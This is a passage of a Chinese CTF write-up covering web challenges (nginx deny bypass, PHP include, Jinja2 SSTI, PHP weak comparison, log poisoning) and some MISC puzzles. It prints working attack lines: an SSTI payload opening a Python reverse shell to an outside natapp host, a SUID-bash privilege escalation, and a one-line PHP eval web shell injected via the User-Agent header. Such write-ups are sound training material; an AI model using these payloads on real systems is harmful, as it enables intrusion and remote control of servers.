旁路字符</th></tr></thead><tbody><tr><td>1.22.0</td><td><code>;</code></td></tr><tr><td>1.21.6</td><td><code>;</code></td></tr><tr><td>1.20.2</td><td><code>\x09</code>,<code>;</code></td></tr><tr><td>1.18.0</td><td><code>\x09</code>,<code>;</code></td></tr><tr><td>1.16.1</td><td><code>\x09</code>,<code>;</code></td></tr></tbody></table><p>更详细的关于nginx-deny绕过可以去看这位大佬的文章：</p><p><a href="http://missmoon.cn/archives/nnginx-deny">http://missmoon.cn/archives/nnginx-deny</a></p><p>既然知道了怎么绕过，那就实操：</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101004526738.png" alt="image-20251101004526738"></p><p>先开启右上角的<code>\n</code></p><p>先在secret后面随便添加一个字符，比如1，方便等下修改</p><p>然后选择hex，选中1的hex编码，再将其修改为85</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101004653136.png" alt="image-20251101004653136"></p><p>再发送请求即可得到flag</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101004710639.png" alt="image-20251101004710639"></p><hr><h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h2><p>这题看着很唬人，好多代码，好多操作，但是我们最需要关注的是这段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]),<span class="hljs-string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]),<span class="hljs-string">&#x27;php&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>分析代码</p><p>这里有两个关键操作和一次安全检查：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">过滤点号：<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) 会移除 page 参数中所有的点号。这主要是为了防御路径遍历（例如 ../../etc/passwd）<br><br>检查文件内容：<br><br>!<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]),<span class="hljs-string">&#x27;&lt;?&#x27;</span>)：检查文件内容中是否包含 PHP 起始标签 <span class="hljs-meta">&lt;?</span><br><br>!<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]),<span class="hljs-string">&#x27;php&#x27;</span>)：检查文件内容中是否包含字符串 <span class="hljs-string">&quot;php&quot;</span><br><br>只有当文件内容中既不包含 <span class="hljs-meta">&lt;?</span> 也不包含 php 时，才会执行 <span class="hljs-keyword">include</span> 包含该文件<br><br>如果上述检查通过，则通过 <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) 包含文件<br></code></pre></td></tr></table></figure><p>那么我们就可以直接构造</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">page</span>=/flag<br></code></pre></td></tr></table></figure><p>参数 &#x2F;flag 中没有点号，所以过滤后依然是 &#x2F;flag。绝对路径直接指向服务器根目录下的 flag 文件</p><p>文件也不含有php文件的内容</p><p>通过校验后即被包含并显示到页面中</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101010317456.png" alt="image-20251101010317456"></p><hr><h2 id="ez-fastapi"><a href="#ez-fastapi" class="headerlink" title="ez_fastapi"></a>ez_fastapi</h2><p>这题进来没啥信息，直接看附件</p><p>主要关注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">Jinja2 = Environment(<br>    variable_start_string=<span class="hljs-string">&#x27;&#123;&#x27;</span>,<br>    variable_end_string=<span class="hljs-string">&#x27;&#125;&#x27;</span><br>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/shellMe&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">shellMe</span>(<span class="hljs-params">username=<span class="hljs-string">&quot;Guest&quot;</span></span>):<br>    Jinja2.from_string(<span class="hljs-string">&quot;Welcome &quot;</span> + username).render()<br>    <span class="hljs-keyword">return</span> HTMLResponse(content=<span class="hljs-string">&quot;&lt;h1&gt;Welcome!&lt;/h1&gt;&lt;p&gt;Request processed.&lt;/p&gt;&quot;</span>)<br></code></pre></td></tr></table></figure><p>看到jinja2我就想到SSTI</p><p>而且这里的username也是直接拼接的</p><p>不过这里的jinja2自定义了，<strong>不是{{}}，而是{}</strong></p><p>但是输入{7*7}发现没回显，说明是<strong>盲注SSTI</strong></p><p>可以通过sleep来判断是否存在该漏洞</p><p>构造：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">/shellMe?username=&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">258</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;time&#x27;</span>).sleep(<span class="hljs-number">3</span>)&#125;<br></code></pre></td></tr></table></figure><p>发现确实三秒多一点后才响应</p><p>存在该漏洞</p><p>本来想通过时间盲注出来的，但是怎么也成功不了</p><p>然后又想着试试<strong>反弹shell</strong></p><p>我是通过natapp再传输到本机上的</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101032004575.png" alt="image-20251101032004575"></p><p>传入：</p><p>python反弹shell命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/shellMe?username=%7B%<span class="hljs-number">27</span>%<span class="hljs-number">27.</span>__class__.__mro__%5B1%5D.__subclasses__%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%5B104%5D.__init__.__globals__%5B%27__builtins__%<span class="hljs-number">27</span>%5D%5B%27<span class="hljs-built_in">__import__</span>%<span class="hljs-number">27</span>%5D%<span class="hljs-number">28</span>%27os%<span class="hljs-number">27</span>%<span class="hljs-number">29.</span>system%<span class="hljs-number">28</span>%27python3%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">22</span><span class="hljs-keyword">import</span>%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%3Bs.connect%<span class="hljs-number">28</span>%<span class="hljs-number">28</span>%5C%27sd57f697.natappfree.cc%5C%<span class="hljs-number">27</span>%2C43520%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%3B%5Bos.dup2%28s.fileno%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%2Cfd%<span class="hljs-number">29</span>%<span class="hljs-number">20</span><span class="hljs-keyword">for</span>%20fd%<span class="hljs-number">20</span><span class="hljs-keyword">in</span>%<span class="hljs-number">20</span>%<span class="hljs-number">280</span>%2C1%2C2%<span class="hljs-number">29</span>%5D%3Bpty.spawn%<span class="hljs-number">28</span>%5C%<span class="hljs-number">27</span>%2Fbin%2Fbash%5C%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">22</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%7D<br></code></pre></td></tr></table></figure><p>在终端可以发现已经连上了</p><p>尝试读取flag，发现没权限</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101032206055.png" alt="image-20251101032206055"></p><p>尝试了很多方法，最后发现flag在环境变量</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101033055129.png" alt="image-20251101033055129"></p><p><del>提交不成功，问了下是忘记置空该位置了，不是正确的flag</del></p><p>那就开始尝试<strong>提权</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101124451042.png" alt="image-20251101124451042"></p><p>发现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">User ctf_user may run the following commands on 7c5744ed61414f58:<br>    (ALL) NOPASSWD: /usr/bin/chmod<br></code></pre></td></tr></table></figure><p>意味着可以无密码以root权限执行chmod命令</p><p>获取root shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 将bash设置为SUID root</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> u+s /bin/bash<br><br><span class="hljs-comment"># 以特权模式启动bash（-p参数保留SUID权限）</span><br>/bin/bash -p<br><br><span class="hljs-comment"># 验证当前用户</span><br><span class="hljs-built_in">whoami</span><br><br><span class="hljs-comment"># 读取flag</span><br><span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p>得到flag</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101124651050.png" alt="image-20251101124651050"></p><hr><h2 id="锦家有什么"><a href="#锦家有什么" class="headerlink" title="锦家有什么"></a>锦家有什么</h2><p>看到题目其实就想到了jinja</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101142017739.png" alt="image-20251101142017739"></p><p>按钮点了没用，F12看源码</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101142129501.png" alt="image-20251101142129501"></p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101142145152.png" alt="image-20251101142145152"></p><p>没给参数名，只能猜</p><p>看到hello，<strong>guest</strong></p><p>想到可能跟名字有关，尝试了username，user</p><p>最后<strong>name</strong>成功了</p><p>注入：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">joiner.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>得到flag</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101143513817.png" alt="image-20251101143513817"></p><p>或者直接利用<strong>fenjing</strong>工具一把梭</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python -m fenjing scan <span class="hljs-params">--url</span> &#x27;http:<span class="hljs-string">//node10.anna.nssctf.cn</span><span class="hljs-function">:25870</span>/<span class="hljs-keyword">try</span>_a_<span class="hljs-keyword">try</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101143059162.png" alt="image-20251101143059162"></p><p>等待一会儿</p><p>得到flag</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101143118060.png" alt="image-20251101143118060"></p><hr><h2 id="normal-php"><a href="#normal-php" class="headerlink" title="normal_php"></a>normal_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;next.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;cdusec&#x27;</span>]!==<span class="hljs-variable">$c</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;cdusec&#x27;</span>])==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-variable">$num1</span>=<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;num&#x27;</span>][<span class="hljs-number">0</span>];<br>        <span class="hljs-variable">$num2</span>=<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;num&#x27;</span>][<span class="hljs-number">1</span>];<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-number">10520</span>,<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;记住这个数&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;这都记不住?&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num2</span>==<span class="hljs-number">114514</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我不想要这个数字!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num2</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想十六进制绕过?&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num2</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想八进制绕过?&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num2</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">114514</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;好了你可以去下一关了&quot;</span>.<span class="hljs-variable">$next</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我现在又想要了,嘻嘻&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不er,md5你不会&quot;</span>;<br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你看看传什么呢&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析代码</p><p>首先传入GET传入a，POST传入c</p><p>并且会把a解析成数组$b</p><p>然后传入的a的cdusec的值有一个md5的弱比较</p><p>可以通过0e绕过</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">v1</span>=byGcY&amp;v2=<span class="hljs-number">240610708</span><br><span class="hljs-attr">v1</span>=QNKCDZO&amp;v2=<span class="hljs-number">240610708</span><br></code></pre></td></tr></table></figure><p>这四个都是0e开头</p><p>然后要求传入的a中还含有一个数组，数组[0]&#x3D;10520，数组[1]不能等于114514</p><p>而</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">intval</span><span class="hljs-params">(<span class="hljs-variable">$num2</span>,<span class="hljs-number">0</span>)</span></span>==<span class="hljs-number">114514</span>)<br></code></pre></td></tr></table></figure><p>这句会截断小数点</p><p>所以可以输入数组[1]&#x3D;114514.5</p><p>尤其需要注意的是，将传入时进行url编码，不然会出错，我在这里试了好一会儿</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?a<span class="hljs-operator">=</span>cdusec<span class="hljs-variable">%3</span>DbyGcY<span class="hljs-variable">%26</span>num<span class="hljs-variable">%5</span>B<span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>D<span class="hljs-number">10520</span><span class="hljs-variable">%26</span>num<span class="hljs-variable">%5</span>B<span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>D<span class="hljs-number">114514.5</span><br><span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-number">240610708</span><br></code></pre></td></tr></table></figure><p>得到下一关路径</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101212007872.png" alt="image-20251101212007872"></p><p>进入后</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101215657382.png" alt="image-20251101215657382"></p><p>发现大部分常用的文件包含读取手段都被正则过滤了</p><p>寻找信息，是apache服务</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101215747649.png" alt="image-20251101215747649"></p><p>尝试能不能进行日志包含</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">?filename=<span class="hljs-regexp">/var/</span><span class="hljs-built_in">log</span>/apache2/access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>读取成功</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101215819135.png" alt="image-20251101215819135"></p><p>日志有UA头，那我们尝试在UA头里注入php代码读取flag</p><p>访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://node10.anna.nssctf.cn:28018/leeevvvel2222222.php<br></code></pre></td></tr></table></figure><p>并设置UA头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101220116483.png" alt="image-20251101220116483"></p><p>再带上参数访问</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">?filename=<span class="hljs-regexp">/var/</span><span class="hljs-built_in">log</span>/apache2/access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>发现flag</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101220241296.png" alt="image-20251101220241296"></p><p>还有一种方法，插入一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;123&#x27;</span>])<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>前面的步骤一样，修改一下插入的UA头的值为上面的一句话</p><p>再使用蚁剑连接，连接成功</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101220821313.png" alt="image-20251101220821313"></p><p>在根目录发现flag</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101220907276.png" alt="image-20251101220907276"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>附件内容如下：</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101155441363.png" alt="image-20251101155441363"></p><p>直接丢给<strong>百度识图</strong></p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101155512797.png" alt="image-20251101155512797"></p><p>随便点一个，得到关键字：<strong>红原月亮湾</strong></p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101155532544.png" alt="image-20251101155532544"></p><p>地图搜索，得到<strong>G248</strong></p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101155616377.png" alt="image-20251101155616377"></p><p>得到flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cdusec</span><span class="hljs-template-variable">&#123;G248&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到~"></a>真·签到~</h2><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101155822622.png" alt="image-20251101155822622"></p><p>好人一生平安</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cdusec</span><span class="hljs-template-variable">&#123;welcome_to_玄武杯&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="盯帧"><a href="#盯帧" class="headerlink" title="盯帧"></a>盯帧</h2><p>附件是一个gif</p><p>题目又说是盯帧，那就是<strong>将gif分离成图片，图片上有一部分flag</strong>的设置</p><p>使用 gifFrame工具，直接拆分</p><p>得到：{dwa_</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101160528429.png" alt="image-20251101160528429"></p><p>得到：bjsh_</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101160552691.png" alt="image-20251101160552691"></p><p>得到：cwnj}</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101160616454.png" alt="image-20251101160616454"></p><p>综合就是：{dwa_bjsh_cwnj}</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">cdusec&#123;dw<span class="hljs-built_in">a_bjsh</span>_cwnj&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="加密的pdf"><a href="#加密的pdf" class="headerlink" title="加密的pdf"></a>加密的pdf</h2><p>附件的pdf被加密，且在其他地方也没找到提示或者可疑点</p><p>尝试爆破，使用<strong>pdfcrack</strong>工具，配合<strong>rockyou</strong>字典</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">pdfcrack</span> -f misc4.pdf -w rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101163121949.png" alt="image-20251101163121949"></p><p>得到密码<strong>123qwe</strong></p><p>打开pdf得到一串二进制</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">01100011</span> <span class="hljs-number">01100100</span> <span class="hljs-number">01110101</span> <span class="hljs-number">01110011</span> <span class="hljs-number">01100101</span> <span class="hljs-number">01100011</span> <span class="hljs-number">01111011</span> <span class="hljs-number">01100001</span> <span class="hljs-number">01100010</span> <span class="hljs-number">01100011</span> <span class="hljs-number">01011111</span> <span class="hljs-number">01100100</span> <span class="hljs-number">01100101</span> <span class="hljs-number">01100110</span> <span class="hljs-number">01011111</span> <span class="hljs-number">01100111</span> <span class="hljs-number">01101000</span> <span class="hljs-number">01101001</span> <span class="hljs-number">01111101</span><br></code></pre></td></tr></table></figure><p>去厨子二进制转换一下即可得到flag</p><p><img 